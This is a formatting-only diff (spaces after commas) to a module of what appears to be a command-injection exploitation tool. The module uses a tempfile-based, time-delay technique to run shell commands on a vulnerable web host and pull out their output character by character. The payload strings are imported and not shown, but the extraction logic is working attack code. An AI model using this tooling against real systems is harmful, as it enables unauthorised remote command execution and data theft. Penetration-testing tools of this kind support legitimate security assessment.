@@ -41,7 +41,7 @@ from src.core.injections.semiblind_based.techniques.tempfile_based import tfb_pa
 #-----------------------------------------
 # Check if target host is vulnerable.
 #-----------------------------------------
-def injection_test(payload,http_request_method,url):
+def injection_test(payload, http_request_method, url):
   
   start = 0
   end = 0
@@ -96,7 +96,7 @@ def injection_test(payload,http_request_method,url):
     parameter = parameters.do_POST_check(parameter)
     
     # Define the vulnerable parameter
-    vuln_parameter = parameters.vuln_POST_param(parameter,url)
+    vuln_parameter = parameters.vuln_POST_param(parameter, url)
     
     # Define the POST data
     data = re.sub(settings.INJECT_TAG, payload, parameter)
@@ -131,13 +131,13 @@ def injection_test(payload,http_request_method,url):
   end  = time.time()
   how_long = int(end - start)
 
-  return how_long,vuln_parameter
+  return how_long, vuln_parameter
 
 
 #----------------------------------------------
 # The main command injection exploitation.
 #----------------------------------------------
-def injection(separator,maxlen,TAG,cmd,delay,http_request_method,url,vuln_parameter,OUTPUT_TEXTFILE,alter_shell):
+def injection(separator, maxlen, TAG, cmd, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell):
   if menu.options.file_write or menu.options.file_upload :
     minlen = 0
   else:
@@ -146,17 +146,17 @@ def injection(separator,maxlen,TAG,cmd,delay,http_request_method,url,vuln_parame
   found_chars = False
   sys.stdout.write("\n(*) Retrieving the length of execution output... ")
   sys.stdout.flush()  
-  for output_length in range(int(minlen),int(maxlen)):
+  for output_length in range(int(minlen), int(maxlen)):
     
     # Execute shell commands on vulnerable host.
     if not alter_shell :
-      payload = tfb_payloads.cmd_execution(separator,cmd,output_length,OUTPUT_TEXTFILE,delay,http_request_method)
+      payload = tfb_payloads.cmd_execution(separator, cmd, output_length, OUTPUT_TEXTFILE, delay, http_request_method)
     else:
-      payload = tfb_payloads.cmd_execution_alter_shell(separator,cmd,output_length,OUTPUT_TEXTFILE,delay,http_request_method)
+      payload = tfb_payloads.cmd_execution_alter_shell(separator, cmd, output_length, OUTPUT_TEXTFILE, delay, http_request_method)
 
     # Check if defined "--verbose" option.
     if menu.options.verbose:
-      sys.stdout.write("\n" + Fore.GREY + payload.replace("\n","\\n") + Style.RESET_ALL)
+      sys.stdout.write("\n" + Fore.GREY + payload.replace("\n", "\\n") + Style.RESET_ALL)
       
     start = 0
     end = 0
@@ -264,18 +264,18 @@ def injection(separator,maxlen,TAG,cmd,delay,http_request_method,url,vuln_parame
     sys.stdout.write("\r(*) Grabbing the output from '" + OUTPUT_TEXTFILE + "', please wait... [ "+str(percent)+"% ]")
     sys.stdout.flush()
 
-    for num_of_chars in range(1,int(num_of_chars)):
+    for num_of_chars in range(1, int(num_of_chars)):
       for ascii_char in range(32, 129):
         
         # Get the execution ouput, of shell execution.
         if not alter_shell :
-          payload = tfb_payloads.get_char(separator,OUTPUT_TEXTFILE,num_of_chars,ascii_char,delay,http_request_method)
+          payload = tfb_payloads.get_char(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, delay, http_request_method)
         else:
-          payload = tfb_payloads.get_char_alter_shell(separator,OUTPUT_TEXTFILE,num_of_chars,ascii_char,delay,http_request_method)
+          payload = tfb_payloads.get_char_alter_shell(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, delay, http_request_method)
           
         # Check if defined "--verbose" option.
         if menu.options.verbose:
-          sys.stdout.write("\n" + Fore.GREY + payload.replace("\n","\\n") + Style.RESET_ALL)
+          sys.stdout.write("\n" + Fore.GREY + payload.replace("\n", "\\n") + Style.RESET_ALL)
           
         start = 0
         end = 0
@@ -369,6 +369,6 @@ def injection(separator,maxlen,TAG,cmd,delay,http_request_method,url,vuln_parame
     check_how_long = 0
     output = ""
 
-  return  check_how_long,output
+  return  check_how_long, output
 
 #eof
